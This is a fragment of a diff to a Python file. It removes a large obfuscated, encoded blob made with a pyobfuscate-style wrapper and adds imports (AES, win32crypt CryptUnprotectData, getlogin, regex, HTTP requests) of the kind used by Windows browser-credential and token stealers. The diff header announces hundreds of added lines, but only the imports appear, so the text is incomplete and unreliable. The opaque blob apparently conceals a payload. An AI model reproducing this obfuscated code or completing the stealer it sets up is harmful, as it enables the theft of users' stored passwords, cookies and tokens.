@@ -1,9 +1,565 @@
-import random ,base64,codecs,zlib;pyobfuscate=""
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(ord)'],['''Kzg4O87y>tzP^U;bRbZMoN`$io2Yr*K2!KS$r&LSRrw+mkO1`fAF6CklSXR9^jT=)_jP7{mG_2LHvRK3$Y15Ln6@dQS*|kJpT6shZ&6@7UbQq<z7hNS_3rry2y!cSsufOdKx&nP1#4-`3Ag)4Y{@^yC>5kG<Mf4ZK`1Cy6(#`82^oh*>|cC1@-#Un{g8<ME~YHcBn9^+ILUUKEYD~rk-&0TodzU3=Roeav1XG-!C$8(EWu+3n82<FTaI##VZ|Iaxq32~Pc<2F#kaXnF8MnvoAwVnS1J+{NRatsHH!#9Ewa(=zh3HPtk4v#lA;<XnO2gldhTUhs+G-YVAiBRUt@*EQ_-%Kq|LoT4_vQVmM3Nk;=)}GIwqBQ&Xt#tVxoLdP_NA|ni1|>y~e~k*6_zu;@uNUVhthQrM;>KB3K-{w4aJ?T0D4Ok=-P5bJT&y#J0IFSQz4+YQf%_V8&C|zlLawZlJj&?@3N)8eHzBb=ot!wqSZLiVd?C3n#TcIli*+2m>Jj=ALW()C6x3?xW!q=U6zYE2mua9u{iq-z|cnIVNx}rWUMI_=g7+oUx~9(Y61~X$d+;j!mzuW`9W#&6j#TYty+cyuJ&P&e5UUe1IpdDP((f6!Ti3opre+&HjY03gitR584-&$zWUCT8S6C-;UIR^77Q3p{IlXlYa3C$hqMw$VAO%8I7+A*mF1Vc~X{+=CEF+y7GW-$-#4>e0q?0Y@`6kz>cX{72c2!)cV7I^0wzTNN#qf<IM{&2g-A`BEsu|BtN+rJ;pTEm@c>onF?JUw&V^eY-PGMw=dWH^c>GA;XoW0-cbtP`Mf)*`@6hh8W!_-CCBw91o)!vjk9?#*RcLtK~tmk938zHvW0!|)`T=D9T*K!P&=t=f%@vZx`W1@Hk;f<q!Z|cTrYCKpQHU}C7bGjVKadm=Cc(&wS5+0XU(pz;Q(+v!wIZ|oW?BdJc+Efj0~#UN<$Y~qE_S-9XF1@uldHnvOFASTm9P_x?ku*V{kaRTJmAr>yBZGp<0b=lg@LOA(Eg$1-`^Mvf6s<F+m&<k20Aj?PBj$M1onX)W1XWI4od#P#w^*r7PRF8rkAnkimqE=XzQpunzrMzLMo!r^Yg$_b3NR$<kD`T~Ebu-q<UfV{vt1;L`t-IOuDzMBOR~6b`d&M*;mtcvW6BX$O*KEb;orQgx^SuG<`h0`yX*!5Y)4Td2VD%GZ5k2t5c+G^b83USeu7)tlKfPi&ZzzB?k<<yO8#W1!lq+~p+D^1rYx^TTQ3`-l-j4O^N0!)@hdsqSRK^elmbIM*WAi}^34%%7hM5GLLX^qE`tffCU1<Bqs{<(St3%o<m}t&NQ%<AvUo>h!DJ)RO6wI*e|>y1H#vap@(O=a^>CH|U6mhTOf>YsQRva-J%wv>4KD_X`;vyFjAj>i6O7bxo2rp`AW)W5DmI3;}DROC-jnF4kN5PO=-*H4aD@WL71vMo5e4Wzz6<cPw6dh?zuU=_<-26=*1<z8|Jbu)wF5u_v`06OTqaT0F@q<<--o)DgN^G%Kguw$9c&JJ6!+doSmgeV5j<o|5fuD6T}dDZ9_fd5|1wUy<GfImSbQnHY~3N&irEx+L*H5FNuoBzyC~4A>dccFKieRwIxuWg=$wt9MG}YGlf6r$%LJ^HTBNO5BAsZ3>?A0ROlPPbMxuEY-Z0MhRKmfPz>&mr~6Gi(s%oRLCQ3J9^pK`y=A21J(gUp8C%FJ<nXfFF+yAr^wN<u1xo58YnI!laL-!n!K#X{)KfkHV8xWW!Iw3D!41yYjP&d)xonnyrYoEzT&T_*0d%0-{8T5%tSj%L|Uzk1vUz^wMlc0hijBe+nsqCPOPVdR>-zw<8y<XqT+JU9&qIv9S6I@4q>pln&^hJr#lGPo<umZ;R-;GIW{Ux2c$KddQ9ar;utx;|IyLGZ{~<U{0Gbj!=DST0+`r&9Q^<I!45Px_^{-^DG<IkEPj#WS)#&@iP+p)Z@SanU&|YHk0?S%sEvZQW2PSuTyxhZ-Jzk+9h4QmJV@&kpu+F}W=flvsud2v8%WQ$%JAe99a*Zb8Vw;Nxz%rN^t5LO=Z}3e(6y%E50zl4kuynany*GBH=0m_nASk8Fv&NE<i>8@-<e~+D7wak`R<qubvSpcW#1tZye>Crs1SfXakhsER{_uDqc=Uq9&qIKKV043j|W|;UR)h1RRD>p#@}EdlYJ&Ra?ch$eeQst8j8$9`RL7krI_Wz80fOXQRjhzvE;w!y%&f9q6AUB>+rb`2qoGO9Hd9}I~fj@l-4&k%kocPeJglG54+=(Dl(`P(jo44v1y4QwUl>6O(e|O_J`KxZ%x>zb8!PCTN0Td8X^B^vK}6XbjvMdYCB4a`@SS&wa&vzZB&C?+L}C~cUd1yvSws0K(p*&t%+5T-{-C_6M`vbgM<Xb<(XyY&Q#M~cAs7BNN1Rf;pgAL=9wJu??m*4gfd#unMv$jFAryR5JBExD8E=qR_FI7h7<MQF@8fqMAUue(P-xyI;uB%U(2gXFzq1i)3IlYw@qaOq3>5`lBDXx&GVOA<K<Vs6#LB<HHJyhz}3Gt(K>4AY01zA69z7K=DZ5a)6|BC6^&dvx*@Fng-CQ+7}~%@*|tN6(%`3;O`B_`9cZ#6r&OaGcmNUW#0CRuM^aoP-y6C-#ODxIBW+A7b$>E}Un8jd#0N{ixgtaNbj@pBgPU+O%K(oepLac|t1F_u_;Ay?Kp#ksnEMu($--SDXY@?R8lw4<7fHM4UgI8UYAxNnzINh-vWqKC=<|hV>tw`eE8c4mK)zHZp0#6B`Z>pGiUCDJbIp4)t`{(*536x4`tm1Kr&iNf<bTU&bHw3aT>=8SR#e>4Z8fYs-z}M+d>3fOpTZi>%P9Y5Ot#Kie8fn{1RN%$zGhaFv<`D{?GncJiQu%U3w7culgWkHOQfMlB(agyRv|Y*FIbnxZ#nY!1J3)AKUj7kN802CM@;+WFd>CYiuK<9C7P=R0qh9PnIt2wZr+RQapFyUA&~3s(}^c+McrCX1)Ylz#Bkb~d<#*)T1I^F<eW`7<BF)BBa2!9rY=|&zeGtVnim%V+35=G^NbLK>I!*sj?%_rx%2*>A@MXHTE!V}Z(ozo-O9%l?E;xO(Fo?(Nej_WH_yf4p%Hu$pIThlh5N%sV-o0|bbAZ^a9Lb=*b9keo!!s~@=!A7Kii&Pi*9<bskG#+v!Cm9Nx(>z;RXswYi1Iy;oRoNeUSnl2c`a&oJ}-V{WI^cM&c7($1jZzRJ81LH?x$AsvE{Rury;YLDKFQ)y-iYp@WtK)x7v7enQaRa)D}g9H5vaVBZLu%N*lV<EDg1A*Tgz(eN@ptD}M*q5fZ}3E5`l9D_^Bj0hL~FGj{P8H}UkzJ<Bdc%v+LZ{LTqle!xj!jJ4c*$lIasDA`%PB-!~n*gD~1%ab$7evH8MKDY$%{j62_*ATd+%2Z+_3IHDskh1AoNG_#EMVa;43jz7HufWHX3jnm7un34iH#ERQ;hJwS4m5+Y}}RJmxMG+Ny&5+!nA`c>qV6ViYal(=<t1Z7w&_^ard$ROnK)e*_U_ylRAt2+&X28f0H@RT{y+KO~{pc1A>O-{0kWfpNCh*Y<n2M18nbBhpC>76{#pGcp9r*F0?6}^0A~Ebl9Blc{}TK+O)1vSK#F=r=@4(d1`-f^Z_a5^OmVA!({1`5rLaQlLuhc2CnBb^o;t!Pm8d)J;wJqM%rdcJWWl*ODurs^`It(+s=pii#F*r;$JOE4KU?6qYiPr7)70w2`GpsjCJEJi`<}@SG3~3rlu1pTbP|Bmp9qln#iN^L@3V8m0Hs>RSqP>svX&}Uyly3Y`vxk^|@}y2{X>keppGPA{(fur~$pKZwx-lC@RQKq&qWYxe1-jl}=eILg7okQV%!m?iyy305Ed1zH9uApp4b4F}NR@$td9+g7FI1z_gLdh>^`KN0CaE_%4Is$XFrqjboKE2TR>WLCz0RLY6V)mcB^Ut~|xj<-qk2Bbx_-dwWE;7$Y;ro0=e&rsX@TZJ%w}A7N$KcL0v!ugb(Hr#L^^NrA3K*u*ZAPXxXRf@Hsq{NYwCP~;82Vep$|L`kr$lJO$s`#$_6=(2zg#VR=?u+n<iFApG+`z)yOPu@UD@D4ns9o>>@eQMeyVh)yi^o;4@2J&fc7WUhul1j{SdITA}pVOeBK@m?T`%YC=GpX}E^IOy1BD`_cT%*9NXEi$%-8um5FHM;`@fQY&m2r1VWrONhd4y%*jLe6lK*HlUeflV30~$6hpG1MNu;UQ|6xnhLdx|dCkOxXy+;Yx<7+{ihVq@a*A@wH0je<PLx92jdO}GcH&>?!Tc+SwzMj=|suT>7aX8xNyE?#RD@?IjC1l*9%L%(w$^#{D9-u$ZQPz9VZV{W3463b{;AF<1yQ~y7u{a+E4mOqWdc)k>$wU|GTBzvpH%W7ly-P_$FZ?X{g+*@RfLum%7CjE6umCQfT-G-cr<v<L;T&H(vRfr8Q6S_{KAQ2aDigF#$MIZ?(In3x7*bVG%=8Difyll8ar*zf=f;u9$;Qvq}{+?EUNqVqTPTg-!CPSr@pPhC`BJ3k42_n!jPkNf!yo6kdT#8i(s5V3R#-up}qt<fZS@Lh%)J4)55+CjnTkRveXK?VAsbK#AHUz34`Iq+mx`F!|X^PqA(654#3bl6(rlo0Kgbb(|42(v3Nr}*QPX9YG0~ydYa`KS?Dpm4}Zy5oX-?ay(|G}?KCsxt_jF#Fh>Vj=w0qPHNvh<`>2=0_c<Orw4fE?2x+<j$`O0>Vkta*6$Gc(GV%?}-weT1`;Eb-<`t1q=8FyB?56Ov!#BM7o2Wb$+bj-sE7hTwQ0d{};lLiWubOC=Gpq5FL?P2p;XJdmJfvkP<C4X?z%@F@-%<E7|E#bcN7mZO${Pf$abW4Q7c(6>Xr8arcp_-UfPplQ=z?6@lDiTmdacgH4Wf*@3AHxlp|P7~&azgdkJZ=uC%RE85_O|e3B2nYXD*DLT33_d4<v_`vd;{ligQz6@mR$h`}FMy?3XiZ)|zssR3_gw{UXS$IymTZp+0a&Q~0;~4aY<qSh-
-KMgKJRswrne(1>S8Qy4-<02E+m%a=nBaSa4X9I>m2%x#E{?5pt@?pP<;hh5iq7px-Q%&X?z4!KJ~4Fv0K<-1`~pyh5j3amTh?Y5fxi!F%ou>ww+01j17i-VTbrw?bR$+P1N?hi!t7~DQkgzi#DgmO_w;Y>=9f*nBFnP0*M4P2u00)IiE%fDi#(Z-O~e4t>dG49D0_HDU25{4>m<cao6a&ZV`Ab|jJgMKId+f@7<v;Iw$?(s4a*L*CqBVjYZZ^@EOi6ZL*C}dZUwhYZJ_|aHk`%jHm~|(Uk&*r*#=_ZLgh@OYr>1^sX*-nNM3sNboC73zEaEW)NDO_O%DO|kt`tYJlVWAj8orn!Datz75~Bl9QazFK(OgUlI#OXEGH5;P`>UVo*#Hk_V)5|VK#N*V+}*!K!oi%$Ohs_pAddZv8I}ktSvY9mH4gzP4dUJESh8G2D+$LnZdBfiuZkAn#8SndcFd*bPqokfL6kB)PR)QbX4>fb^(W{|C>V((2&6oUcLj>Iulg?sJ1JwKTC2=e|yzlgQ%uQ@!)}8;B&rjP+b`ux*25AZp(8&!wE6O-v^5oy3`g>2GoaownlHADVB`(_Pk7P$om<ZpU*0g=T8l|H^pYQIu6#k<}ihSARdtbVAT;q$y@rYXx5zgra}%imxM8{o{FIVFk8Qo!_!H}mc0w4Qimu_i?gE9sN-`6X&B8}TEqu$Wm<l(URk1d{<fU8><G|#2*;96$K;(&J#G=_JsnH%2DgY51;;lC=te0=U$KUvmYfFXVHy5*W&t<T6Av01-R&y+Rm?-hKl252{F9w^r;2Km{rZ;V2wvXxZ~;Om(?wqrK<qan?InM1O(G@%QA@eXj^SUi-#9u*T)Emd?bHO<<*qU|sM5xO_jsYY2eFqCM)k-D>Su1JR$*2%a3_;S)(~b{0w*^|q`a8M;0H3htt)Z4ipee#T+e&lyT@B)eY7VIEQpQ!AlA}m$Ef9H;6+%ND0T>-y4Sgt+gIMqow&A!OJ^oZDX41@x}!Y+XPCbU3Z_MB%*(%$MD?&U)%57MI&DmN94oSwL^{sJK!yGk2UhyycCx8HzjrMVZCNFxcc<Vdm@BD?i|cGLe{Z7Egg$fk$&BZ4T#dU-sJJTeBkq{MmR;U49tOqqRypLxFYPNCmlp)VUN{C95YkLOpv@`X!BY48ByHrTo0W?q?v;rA1k9sh?+8mraIK0<8%+omS5RSl^PUaueqb}~;np-Xwd9`31-B>WF6V-s9XC|Z>iLEbO=vP-@k!lb9Y08@K<^b>-Qpqf2q|ujIry4_R=U`Hq}-*xiAdJ&Bzn(IuL-5e**ZyUVWB<uj2Mgpd}6)_Zc_GFxb+%|sAp~==qA1;zxJ~>>)71!=KRJ)s5=|@;<hV`H)F8+f&r+o>4)$Yi~u@KNR5;l0`u@(m>>bKIe8WJJNZ#9;aTa-HWlA5b<42*mXpS4rM{e+6ZK(1I}?B)rZe!fY)i=ahtVcj+K*E359(W$4P9F%Hs>OqMRzlTbP&+MXS;B9#Q1UZc1wJx5=mX}Rc;5wx1mTOnU2}@xAHW&0a<jWv5Qie4b#{G65zXK=Gd@?wemRbcGHZL9<ecFO{!IO2+o6~1<w`ub>*<l?A}#%$mG*_f=v(p(cRRexOqFQ3JQ&1e&rBApR3OB?}J%~xEg52Q!Hbe9K%cNtJ(@F=5;$24s7BJ2nSzEV`feaWW!DUkL+h~ME~d_dazM)@K0;w4e=n@LbHG?EbmWnSKU7>tN2*l)S@x!MDAT?)dm{$@Iupzia?~=X_c;ct68~{g6;7a3o4#FuEDmFX9?=}zi298DqDR0v>W5<e<-ex|0}r7rUkArMukwHx@^nKkVX1jc*-O=1wMcOxw_8Z;-E}mmRrC)8K}HLX0Z)E4KdYgj8gfsRpNEkhdSNz%^-nEr(oLitSS==)F=Y=&<);gt%0-8A4V7wF4UXxhHFwISUWifu6m&IqAK7jeT>wPju1|H$d|c9X(LBc8oQGp+4(UpK>HmGmbHCeLU8aEOp_0dFg_zH2gKH4Jsuz>nf>xR^Joo%5`3*1HsIzw)B<h^z_h2$Q35e>!(8zM78zx~rQt=FOaQIwia328pqvn-!|yv-A^$HlLIuO3s)g#V(}YCNiaCw#k-d<ir!Vg0UQ-~=b!m<gHs$~X{i}IX?|pY%KDwK-ML<<xOjoR8JXQTMJHUwGqa_WoyW{$Qf0aTZff5_0pPp#AvoE##gq*S_yyl6sPXB8@B%UTn@<Pc;Tuncun(IT$p~n9kcCk_9jJk}aWbe!6EQKeTUznz8#iEu(-&PiR54cUeha6VDsfwE)Wya9JX#p+`d>1aD1Ae%;PB%uc3I7x*7lHhf(n6B~CgvFUPC?c%-&L5Z5lbnL5Z1ouZq?v1ipXrh%zytIqd%VBBc3Ce3-j{rZ3plUTo4KKo3u!=d3-b~1Tg2q{2q5K>|ki%aKTwJ5&J(Yod9y;YHX7;&%O-(k*ydDCm~zE^`w!a3O^k>LNLy+RM1KIqncH83+W^iGZ$tr`NhjfFnX{R755F{5P3HMXujd1EW#kmtseHJ2s<bu>Hxm7P{wf*zkjs$$C&4Zn-3d_i*bcowGl`B69zWoOD<$!jDI~gXmw9)!k-~WoYtPUET;33G27KU{#+v0ivcV*YdiP7hB-pA+6K}Me!>i1lC#UD-V~Oq*e4xi1Kerwl8Ln$FC{fn|J9z>OZA*4)k+%}M5O2AV!ElPusr7g_BkxUaA;=|KIhgW*v6e~T6JyrE|q?9=|9Lnh>`AGd`tR9oWZF5Y>Q(PQ6(sZhbK)}#@@S@!*e=Df|HONm6;M7T2*_Mg;dgLRwEC}Hy8k=x0_6$D)}1X7M!HCZaS9|qk}-Mk%^@~xJFvv<}#SyRy>A@O#+PC{q{E|f!r#TX8>(SxHPcR?nB+r2THbf6D3ub^~0=lyEzU6!cXAERrZlv@zg1^80gG_nGP{R%1sl<B5o(#Eh<h(XBGxom80$3C~e?gcyY|AGg4f^r{{rnVBc1%-tS_V&Klr({V58&`u_X;<M>BV<v*EI-Oi|~4M{yrU(P#8fX^ci#)o3S-Oqn^hG6&(VvQ#~M9Bmn4)BmRU64<lT7%1HgFeTCO}bvCZzoA=+^qbAZ{w~FYgz2?t4z)`{B;wX@2h$0*|x}QMpnOn^lPL&B*>8VV}k?8R2dO`82_6UD$gzfH=;SaCyM=|VP7x@-B&S%{T^h;^SZ=lmXmsD74db5`HH73+G<JmvDO+z49&6mMp5NwMKF%+Ku3S&ANaqJ)3upd+JvPRrqJUcwAmL|~^n5Vfn1Pkx%G4j94wA=dkY_{}%nVXn$Zr#E2Hy6$8R#B3i6g5=a84m{1Ejr7b@sMOMvhLrIGl7X%#kQZ~?#WL8KQ22M@amV(V~R@d#bhrJ^kD(|-@EhjC*{$@ny;=p#1S169U}V3T42gP1fRNkIFp|2{+d!WM!eYc2sxfLGH}lVmu7#nSDokIC_WW#d|8qB{F||MliHz2=`~W!{<Kj4NKpR8qm)X%HTm`U5ilIMh)?c9kt8>-cNGq6yr`=~qe?;F(TDK^9z18thOu7?YDSv<j3Skw@loD*@HcD`J&_Uo<6S*dfQ5`Lna~FQuN+dK74HhzFv#JH74g9M59P!N2}5bX7fnA)5Z$R_|Hj(CLUH;oZ`kLIz>f$(an>5l+5M~^V9{GA?CEit09yYl`~UYJXV9_A+v}|}Sr()zrJ&&1dPFi)mrdw?^9d@UD59&gCQU)VcUS0Xjpm9*r8a?8&g8gClUN@5c@2{l3Ixs~Qvzr&t7)gn`1!eqsq0!ua;ldaH-i^5m-|f51j8P$XulT`m-xc*O1?!`N<Tn$hjY8MM&S0(vG48>URE-q(%Xo3{oyd91~ON6Hh0}f=K_<qWHa$*)Ys1#8&Ei<0Q<{R>v1*h;-nVSW5g%aB=bqX+^l`D&7b_IcV$v8kxDUJzfMq~#~(?Pu`7M2VKNzq9n4)Ry#W=n2NmE4f?0egW@Evk#Ofc9TscK!%0crcagx4hR!xbGjojQR!ZPPMUSur#PQc#(umDH?4{_NP0fH%L4#3mV^Maqmg@q!|0<g;csSkHAd;0HNn9j2Bd{)O`yaGUr`MGIx+`t0KlMM!)rZDJk46ER!^Buhg%JF2-xMJarpxe;s<fXA(ywWwC-jJQvD7F|0r}?e-{$(R5uw+dYnyxGtw)1c$Y%N<C^7w^xuVtD&0Oqk<wyHS`n8Z?Uzd=%;4S`*uEPWuc8@@2AH_v9Dl3|nc=I-HP_M2-PM6M6rH`NXNUHqA0S&HV)qQ>CZEY7GcFy5O}sSws_p?UXbbF#Fts4o)j0;i?(*0ts}-BeRg7VJ7gUbJ}jd=@r!w{_FI_(`1dtEI@=Qxpq@80+XX-
-vXZs7p|-qr9ncP!5$OeKSMN`UdS`OXGpPf@5qARrfdrHbo}hk4;F2=J3vrhKt?&3lSC~><s6wgsj3<hZO&u2`XEGxLv{R_R@48FrwBX7)g843xehL&BaI6XIi9w5g7`i<pSnM1si>mC;mRCOg*8kxtyOEBeSKZM5eoR>x+q>n>Q42;jn?dv`V-sQC?(h6tCwmL5D%Vnv*5O9*=tkP7<Yi;X5n6)w_f^7K@BbvAiPl8mHH$|smBaJ^|_sa)?YBIjB~<ueqC!hqEf^bQtL+Vr`uei6@%OtDAo$#(7aza3>mgqHIu@Fu*qBQf8rzw<EGLsq8F(sdK<PHbGSxp9ZiQMlV@+>%Q^!I=<><kxOmN1H<+Gj{CyibqMIm_Mx9TRn<T5UJga5%)>h*NDkD=0brcMiHk7%-XyphqnoOylIz|osx0alHogFVZ(oJ&1n9>PZWrDs{EfR`qBg)3$@Ths_PqV!=pOl_?B(&~OKd&px!CKbT%|Eu}I>5q4kFW#~F<6E_m3kH8CSS1;dn4T40LrVcdv|X*`By47Ps!J7y879FEb}Z4hxB17kVq(4eg*1#l7>FoW8E5H$_H$}&Nwj{nL=FVK9M%|7C$ae>t*ExQvA5Q0Av0LIz?@Rfqm<bc=*W5(sM;3E0r?i?&vJSn?GutF!GFQZ?_O?Oi)CcL_lwg%D9t$l{Xm~a1*}{M1{O@N`*FY$fjq?^6vtW7i%@-Sz?wCNlsdSofy!G`jGw(>m}su*G{z`9n+R!&*-^a5K1E>RM>%BRHOaMFzs2m9rFuAe}qtD&&nmbo7&N-IWu~iriAV0auigvX!oXv)hIVEn*w^!%(ZOhZ9*fef}>vczo+}<D}Cb-wVVlpD(aF(BK0{?5>M%Jk@8C0E%ZkhDKwR3=}z$k?$onV&_j9W1oR9xJ%3DChyNIqtIrCKQzDWO+tGx`G&jj)cBYK$J}fwvt)x)!DaJ0mty$&5rwxXAe5<}Pjx3iST)LIKvjQJI7YFu!@HI6EPkv-(m=2Kcy!|ieVOGbQwmwg`U1|4bRr#15`QTIW{+UNK$noi>pb3q4QYcNP<AvrP>aWz{CS4UbHY*S^Ud20K1EZz$cjCCpPD{;#^0SH8l~ps&^vMuv+0TLL$<FW-swaFhy+pA}40o|S-cEfYP`Ayzvp|vB^MsI&>G~&D$+GB=sZZVSTp_Ap!g0jpT24D3ERD4p?ql~s;zfP0P~fnX@@u4aEZv`k%{IopP5pXeXLiRj!U$GEixYc@I@@QQJpda{jV|0iX)yM_ge>?4Q(4}5ERqj%;l(19HB+JK(SZ)LU7;yY4KiEk5dRv|MdU9+9$!))5UMPFWPJDX_7U)=f*fD-t8!s3U2w3Ua3#=1voWhFXA>jTo65yqigqtP5>5Cv5$-AjdWbFlTxk0<|BxRlf7UBGLbx{wn)w8=(b)4#(ukLroE5j96eOwCT>5$Mp~?)Eh-&5o_6ISAsXTW|oDu=?`IZ=hBjuX(G+Z$A>t#oD>0&qfZ0^DHQ1L&r_^TDkS#D74io{`QH)W#9V!P?y63GNbn?5S6P`cRtV(q=8enJ2vab>nir8q-c(-_vVcCK}Bo9Win@UXhFH9=7M5(%p2&!RNvDh3nbPs<?sqC{jTrpDE{v<ZJB&eEkcW_e|1HmH~1l;+uUnx)`RQF_AOXZr64WLyG-#1qU<**V@2lk%d8OEx@sB#x^#y|<<b+OYH3Co2lpT(is7(+9eCCZwr?NV(e&<XPKLb%>F@FI<Pqs-U7mN7?@$FnG_Sbcyu&34t}fl-D%4>fpC;|L`eyhwyfteZH4mpzmh%ysRmDjgGLEv&zO?zFO~WzqqEAxV1E_M9=jqd%B4o+O$V%kFj&y87`oF!teYP7#z6J(GuLm=kmoS^)rD%HNHQsWrRH@LK~lv27KH8b^=N9A~ke47tw;WL!|{t*P<-_3z~r;4+*Eb;hSmlX3@GW{Ssw)_cnK1Qxap?mzI6b?URm8*Ns4xG_|`0$Rb9+80@mTdg<~a-ZyjP7mOdNc7{-3=(CS^4As{>3K|%2ePW-F1Cr0@c}rPsgX=+quXjYqjsr(ixq1#M6Ke5b>^E0^&DKaJ&SYNZ5N7`K&fpC3?3=xBb8(R+?~dkYEHr`T5zZY_OO>H51921(2$=<<RUnqeq%jfLz_j33Dv_{dV#^HH&_1Bz51ExX$#AT}%dw#g)vjw;6ohp9Q1loQ*UX2sq9!#5w|Gzl>TK!o$dnAww~wXb99Dy0F3qx>zf_4_jEvjA6V6T;H=A+9&Z975IE%Nde?^K8RRT5Qf`<KtkXv+X;Cu|fHyPs>F*s>r(_0-B0de=})cDb4YKB;kW&{x@iRciRPHh!^x~s|A18ghtg&eG_i<|jSxF94|^IR6%ha^k+I|>aA`Mj)^)0%v14p^%uCI1}Xl{nfrUf!@<X7REC{5(aAKt&??UoCNw)-7!kQ)JB5e#7_9?A@9M==8cs>F<0!6{vkCV;)3>E6}$h9PZVXQ%VLUiTMx~I+01;dpm?oEb2hg0%4zI$}kn!as~$EV;V%(C(E$P>a)5wXo=TJOFaWD9nJNGtut^WuEvyWuD^4qsa|*r$3cC=LzfGw^Bn>b9N42ZK8+aMQ|bX62wva{T%#cvk@$(Wh$_x}H=eqst>qK`Lz4(at}o>1O7|`B2j2cuS4c_rTKMq~(C?pO2}1Ri2=!PM*|%}>?TNKXcqDBR9W=a37a0*5YYe}tlMgrT7Zl;Bf<sZCJ-#WCEFlSKycRwD3vBiur{)YJx&<a*`w+UD&~PpLzc?Nv_RNfk0x=Mb1&y3|hMSNQp3jBbn%N_0#`p418L*UtS6;<+kptL+)`+=o^n|xq8Vcy@NmpH51gT*k9tX;I-mUr=ZE@`c%Q^Orqi=%d)3nzuDpPkIzJv60^4K@dcbs`nUjdr7$eqA+h?Q4x>8bibQh3Y24koX7(PVv^Z78P`mmFYU<ZVz1%_!R}Es~qww&|S-Y0D<kB}LWwy*9KAX=tvH8rZ!6CFR@ngL9calnuX}blk&T62w%Fg1l{A32v1z%MXbT0RcL}eA*1qZp*KYiySIUt@?259)Twv0Y2hZPCd_5^m0(f?pol`I%C`}mPJtIrvSd{<0!gh!s<@wOwzOy+6d}F!8hzaCDa2rJR&9w%BrXcp&611lgz;zmU!LQR)nUASuKC-p?G^mhZ#$$FI-jh)JPgI`iOL0BPRaYS2fgjcd)!eu2b7-qTwVH-O_P0B6vohQS!PLnre9KiD>iZb=aWO_Tj@;t>x3pidrS_wxF3#sbiCnTu9Z$I8Ri``dcw?+|c+1M#|u`M$cJ;m!O5^N_J+&QJ2so+E`vnkQ7%jsuI->D@B?Q!WAW+r?m}WTzFh&Qdg>-;%tfe6-j)%G)vxd*&;{$^lid3!jI*36H(M}K3>D<)zcIBl+YXJ1nwO?anRcAffkf)TmyspT^uV7nvW&Je6J`Jl6pN}SZ9?(w3p4tcZ)z!{8m42J~R%{Se!<9n#<4|+iNzzJE+-JM%BV$Cy2m)yZCrtBtv%Hr}OwYQ2*uI$t>^Cld4Czp2G#yr3;u)WwDf?O5ND{NJO0ci4hayi6*B}WvwCzPG$BipuJ$HZIJUa6SUKadwkRmz^?XswURk(>ZX<wVBqsWi#|i;2*K{>UY`vZ8X=N?sKbim!Sa9?dC$%1mFWJ4Pr9>-4C8~Ws6s$5+TXVwLR&dF3S*|;7KW%MF)}EwTf8foBX3_&>4-kBH~n{_{<2|c2tkMa8Xg?TeG01AD-j_D?cMf4Ey*m~_OJDnoAA!7&9GLH$f8AH+T|nt4qJr#R|+D#Y3|rN*&%|*L(Vq9zZKVcZL@{9!A1SO;+1VT^-@kS<h4Xp=OylOwBQx~oy^>D3`#e%RZ}D@)0{K)(sa4G{|e4XsfCergePug0XwC?VP(Y(?joDd8W2Sr>$eeeYWflLBDI(7Kz&M)4_S63D~%KXj3Ic(Dh;~8non^k?Q064AnyM0Uj72M&If4wL-j6t2ZjfANh4GHG()~;3tuk}0X!rL&nv58;yu3JgPj>S9!r4vM-viSsqsR3b@HgBQVq)G15@dX{5!l&rVPudw4oYzQh+^NVU!JOdqfO`e@uki@7=uo8<v!oy#u7w71_)RRr$A#5<<{tYam1F0p<4br*y8m*N^;b!wQXR%<58My%M@bN_xqO_J-RVzr!;B(r5V=gV%LwUA8D>vIJ%;Hk=8teP*9L2K%3sm_@<G{@LBHbs>`gy937p#ljzr+6wN58_-^R)3TyM*fhPzu#CW}7pNA(>j@Sv?e>u`rV2XlxWPRK$mP4;=XLhB{(cF8y9m9&qLxY{IZ?jBt7H?`$$MV!>~Ez_Rr_uk!Btn!G#U6*K;ZY<5o=9Bdb~HLYPJjal@fuj1FlAo%lKoW4wT@<w;Y1Q94PMHDQpwF|8#eIiQx-
-fo!kzGWJ&ifBZfQ^Tlj|Y@6`Pw%gw&G531XHr<%SHPy<}T#S?;ErYuLXbHqJo3WQR+7LzniU1=fXej5)9+{qs+O10_q-Q1<$-F}{d!)ddQ#>gZw&;6h~8g0SUgdLak`5Mx3624*UViiOon!EY_()46N>2YUvv&}|g?jdysTuT5A#ZF<+f2$Fx)x>-UG&-=w+kp0fe5>-sJ}c;83WwuvYpx!RQxO|O^{^9+X3MML1R_MIlT*_V&k#3wA2Fp}`bl<{5x;m2tOeCL<<_Jot=dOt*D{QtvfOd2aF5#!v4ZDha@hcu`(ixX#kmzcpj9qQ!Kj(s;^m}2<zYz}naiPzx`7+7Ak|B_mRfC3Ril?b?%^IncHHiM=djn}w$eolhT?Vy@oq0+q!`6mV@=V9Y#MfNOu@6c{BQv95KbA`r+u$O^LbB{p_Vh6bEd?$-0#EPuwWcX(!!m?PWIebSvH?i8<c~a^U(!?dZ&nx8GcM!3hNu^DZy;#+9;Z+p=YXusjPx25u+pG{OBak70N47{|4J&4dF&N3h{TLCy|%Cwsl7fV(>uGoXntvn2u<(Z>BoXFg?@}e4y=)rphsA90zi$!|*$bX+8?ar(rC5_%J)OB2~b}#ujn{7!>t@5*uSq+9^rf#8WUcP)#quODtkQ;^B$kyr2u+HNCG@1LzePFq;{*w;JrQ$xr^U|A(!yQ8r(?egSg0VqSyHkw1v(<|txEPS`kl;>pp~z3Z%=wf?1v@7D&Lbpzx4tsXW|VKk%Sp+)rDBoID;=Qtx_bwK2w3k^WMoT|$3=ycy8rTb>VVhxe{p`z#22t$y1tf?XDmvyEAbL_e^l`43K)jA+)0s|nm)aybk2Q`0qnk0i03VsKAl0gyHPZEG7*<B}{seK`ky4!!Lx^3)@zt6gbbcLX;qb~cydyEb2st>Vr!@5P@@wZw5sH7Q`sqV!)mE&kPrsB*4ctDn*WUu~CiBq8^B`yYUA&PCEa6XTliC)WzvT-r9Cf`AQSWd@m`Pdz>l{(r!`8c|8@xnKoXJ{XT+@gxZUXqmrHssjukau(n82Ea~nRN@#AkT|GsxkYFd1EQSm)pzQjE324s`_}*NUhU8t~P892dvnqnd8}Og^Kv}>KCeUs%Wk}+Vm^$><}p<)|_amM`8b~RM07=TKk_y&`m}-^$Z5o#?DJ<)*K%s4fc+>acn)o)4C>kc+Bc3#ae9;7bsi7nt{vyK+6{5tix_#jr&7QnW%Q3OVP&aibJ9ZZ7qv|*U>ALk|f@y2fXLLxqw~S27@&EB